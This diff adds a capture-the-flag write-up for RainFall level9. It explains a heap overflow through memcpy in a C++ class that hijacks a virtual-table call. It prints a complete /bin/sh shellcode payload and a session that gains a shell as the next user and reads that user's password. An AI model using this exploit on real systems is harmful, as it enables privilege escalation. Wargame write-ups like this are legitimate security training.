@@ -1,0 +1,32 @@
+We found a program that looks like it does nothing when we execute it.
+When we disassemble it, we can see that it's a program that was written in C++.
+
+A class N is defined, it contains a char buffer and an int as its attributes, 2 instances of this class are created on the heap with `new`.
+
+A call to the method `setAnnotation` is then done, this will copy `argv[1]` into the char buffer of the first instance.
+Then a call to the operator `+` is done with both instances as the parameters, this is done through a virtual table, which looks like a triple dereference in the assembly code generated:
+
+0x08048680 <+140>:    mov    (%eax),%eax
+0x08048682 <+142>:    mov    (%eax),%edx
+[...]
+0x08048693 <+159>:    call   *%edx
+
+We have seen before that there are 2 successive calls to `new`, after some checks we can see that our 2 instances are separated by an offset of 108.
+
+We can now abuse the call to `memcpy` in `setAnnotation` and the fact that it calls a virtual function to execute a shellcode.
+
+The structure of our exploit is as follow
+- bytes 0-4: An address pointing to our shellcode, in this case, the current address + 4
+- bytes 4-28: Our shellcode
+- bytes 28-108: Filler bytes to reach our offset allowing us to write on the second instance of N
+- bytes 108-112: The address of the first 4 bytes
+
+The command looks like this:
+`python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'a' * 80 + '\x08\x04\xa0\x0c'[::-1]"`
+
+level9@RainFall:~$ ./level9 `python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'a' * 80 + '\x08\x04\xa0\x0c'[::-1]"`
+$ whoami
+bonus0
+$ cd ../bonus0
+$ cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
